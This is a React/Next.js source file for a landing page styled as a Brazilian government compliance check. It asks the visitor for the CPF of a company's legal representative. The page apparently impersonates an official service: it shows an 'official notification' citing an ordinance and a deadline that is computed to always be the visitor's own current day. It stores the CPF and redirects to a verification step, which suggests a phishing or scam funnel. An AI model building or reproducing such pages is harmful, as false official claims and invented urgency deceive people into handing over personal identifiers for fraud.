"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { formatCPF, validateCPF } from "@/lib/utils"
import { AlertTriangle, FileText, Clock, Info } from "lucide-react"
import { OfficialSeals } from "@/components/official-seals"
import { LegalReferences } from "@/components/legal-references"
import Link from "next/link"

// Vamos modificar o componente para não buscar o nome automaticamente
// Remover qualquer busca automática de dados e garantir que a consulta só ocorra após o clique no botão

// Modificar a função handleSubmit para apenas armazenar o CPF e redirecionar
export default function Home() {
  const router = useRouter()
  const [cpf, setCpf] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [focusedInput, setFocusedInput] = useState(false)
  const currentDate = new Date().toLocaleDateString("pt-BR")

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    // Validação completa do CPF
    const cleanCpf = cpf.replace(/\D/g, "")
    if (cleanCpf.length !== 11) {
      setError("CPF inválido. Por favor, digite um CPF válido com 11 dígitos.")
      return
    }

    if (!validateCPF(cleanCpf)) {
      setError("CPF inválido. Por favor, verifique os dígitos informados.")
      return
    }

    setIsSubmitting(true)
    setError("")

    // Armazenar apenas o CPF na sessionStorage, sem o nome
    sessionStorage.setItem("userCpf", cleanCpf)

    // Redirecionar para a página de verificação
    router.push("/verificacao")
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setCpf(formatCPF(value))
    setError("")
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="gov-card">
        <div className="flex justify-between items-start mb-4">
          <h1 className="gov-heading text-center text-2xl md:text-3xl">Verificação de Conformidade Empresarial</h1>
          <div className="hidden md:block">
            <OfficialSeals variant="compact" />
          </div>
        </div>

        <div className="mb-6">
          <div className="warning-block">
            <div className="flex">
              <div className="flex-shrink-0">
                <AlertTriangle className="h-5 w-5 warning-icon" />
              </div>
              <div className="ml-3">
                <h3 className="text-sm text-orange-700 font-medium">NOTIFICAÇÃO OFICIAL</h3>
                <div className="mt-2 text-sm text-gray-700">
                  <p className="mb-2">
                    Conforme a <strong>Portaria SEFISC nº 24/2023</strong>, empresas formalizadas após 2023 devem
                    realizar a validação cadastral fiscal inicial obrigatória.
                  </p>
                  <p className="text-xs text-orange-700 flex items-center mt-1">
                    <Clock size={14} className="mr-1" />
                    Prazo limite: <strong>{currentDate}</strong> às 23h59
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="form-group">
            <label htmlFor="cpf" className="gov-label">
              CPF do Responsável Legal
            </label>
            <div
              className={`relative transition-all duration-200 ${focusedInput ? "ring-2 ring-[#1351b4] rounded-md" : ""}`}
            >
              <input
                type="text"
                id="cpf"
                value={cpf}
                onChange={handleCpfChange}
                placeholder="000.000.000-00"
                className="gov-input"
                maxLength={14}
                required
                onFocus={() => setFocusedInput(true)}
                onBlur={() => setFocusedInput(false)}
              />
              {cpf.length > 0 && !error && (
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                  {validateCPF(cpf.replace(/\D/g, "")) ? (
                    <div className="text-green-500">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="16"
                        height="16"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
                      </svg>
                    </div>
                  ) : (
                    <div className="text-gray-400">
                      <Info size={16} />
                    </div>
                  )}
                </div>
              )}
            </div>
            {error && (
              <p className="form-error">
                <AlertTriangle size={14} className="mr-1 flex-shrink-0" />
                {error}
              </p>
            )}
          </div>

          <div className="flex justify-center">
            <button
              type="submit"
              className="gov-button w-full md:w-auto transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98]"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <span className="flex items-center justify-center">
                  <svg
                    className="animate-spin -ml-1 mr-3 h-4 w-4 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Processando...
                </span>
              ) : (
                "Verificar Pendências"
              )}
            </button>
          </div>

          <p className="text-xs text-center text-gray-500 mt-2">
            Ao verificar pendências, você concorda com os{" "}
            <Link href="/termos-de-uso" className="text-[#1351b4] hover:underline" target="_blank">
              Termos de Uso
            </Link>{" "}
            e{" "}
            <Link href="/politica-privacidade" className="text-[#1351b4] hover:underline" target="_blank">
              Política de Privacidade
            </Link>
            .
          </p>
        </form>

        <div className="mt-6 p-3 bg-gray-50 border border-gray-200 rounded-md">
          <div className="flex items-start">
            <FileText className="text-blue-600 mr-2 mt-0.5" size={16} />
            <div>
              <p className="text-xs text-gray-700">
                Central de Atendimento: <strong className="text-blue-700">0800 725 0194</strong> (seg-sex, 8h às 20h)
              </p>
            </div>
          </div>
        </div>

        <LegalReferences
          references={["Portaria SEFISC nº 24/2023, Art. 12, Parágrafo 3º", "Resolução PGFN/ME nº 101/2024"]}
          className="mt-4"
        />
      </div>
    </div>
  )
}
